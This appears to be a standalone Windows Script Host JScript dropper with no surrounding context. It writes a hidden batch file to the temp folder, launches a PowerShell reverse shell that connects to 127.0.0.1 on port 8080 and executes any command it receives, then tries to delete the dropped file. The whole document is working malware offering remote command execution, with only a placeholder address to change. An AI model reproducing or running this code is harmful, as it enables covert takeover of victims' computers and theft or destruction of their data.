var f=new ActiveXObject("Scripting.FileSystemObject").CreateTextFile("%TEMP%\\r.bat",1);f.WriteLine("powershell -nop -c \"$c=New-Object Net.Sockets.TcpClient('127.0.0.1',8080);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne0){$d=(New-Object Text.UTF8Encoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$s.Write(([text.encoding]::UTF8).GetBytes($sb2),0,$sb2.Length);$s.Flush()};$c.Close()\"");f.Close();new ActiveXObject("WScript.Shell").Run("%TEMP%\\r.bat",0,0);WScript.Sleep(2000);try{f.DeleteFile("%TEMP%\\r.bat")}catch(e){}
